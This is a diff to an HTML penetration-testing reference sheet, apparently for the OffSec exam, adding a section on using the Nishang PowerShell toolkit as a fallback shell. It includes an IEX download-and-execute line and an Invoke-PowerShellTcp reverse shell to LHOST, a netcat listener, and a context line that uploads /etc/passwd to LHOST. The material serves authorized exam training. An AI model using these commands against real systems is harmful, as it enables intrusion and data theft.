@@ -308,6 +308,30 @@ python3 -m uploadserver 80
 # Target uses: curl -F 'files=@/etc/passwd' http://LHOST/upload
 </code></pre>
 </details>
+<details id="ref-15-2a-nishang-secondary">
+<summary>🪟 15.2A Nishang — Secondary PowerShell Shell Toolkit (Fallback)</summary>
+<p><strong>Use when:</strong> you have authorized Windows PowerShell execution and your ordinary built-in PowerShell / file-transfer and shell options are not working. <strong>Not a replacement</strong> for basic Windows enumeration, manual privilege escalation, NetExec, or Impacket. Source: <a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener noreferrer">samratashok/nishang</a>.</p>
+<p><strong>Exam guardrail:</strong> Nishang is a collection of scripts, not a blanket-approved exam technique. Check the current OffSec exam guide and each script's behavior. Avoid persistence, unrestricted automated exploitation, mass-scanning and other prohibited functionality. Use only the needed module on the in-scope target.</p>
+<p><code>[WINDOWS:SHELL:NISHANG]</code> · <code>[TRANSFER:NISHANG]</code> · <code>[SHELL:POWERSHELL:FALLBACK]</code></p>
+<pre class="ref-code"><code class="language-bash"># Kali: clone ahead of the exam (don't depend on Internet during the exam)
+git clone https://github.com/samratashok/nishang.git
+cd nishang
+# Reverse-shell source is in Shells/Invoke-PowerShellTcp.ps1
+grep -n 'function Invoke-PowerShellTcp' Shells/Invoke-PowerShellTcp.ps1
+# Serve only what is necessary to the in-scope Windows target:
+cd Shells
+python3 -m http.server 8000
+# Separate Kali terminal (choose an allowed shell handler):
+rlwrap nc -lvnp 4444
+</code></pre>
+<pre class="ref-code"><code class="language-powershell"># On a Windows target with authorized PowerShell execution:
+# Download/import from the already-running Kali HTTP server.
+IEX (New-Object Net.WebClient).DownloadString('http://LHOST:8000/Invoke-PowerShellTcp.ps1')
+# Invoke explicitly; importing alone does not establish a shell.
+Invoke-PowerShellTcp -Reverse -IPAddress LHOST -Port 4444
+</code></pre>
+<p><strong>Failure checks:</strong> replace LHOST with your reachable Kali/tunnel address; confirm egress to the listener port, Windows PowerShell availability, and whether host protections blocked script execution. Prefer an ordinary built-in PowerShell / WinRM / SMB route when one works; do not disable security controls by default.</p>
+</details>
 <details id="ref-15-2-download-on-windows-every-method">
 <summary>▣ 15.2 Download on Windows --- Every Method</summary>
 <p><code>[TRANSFER:WINDOWS]</code></p>
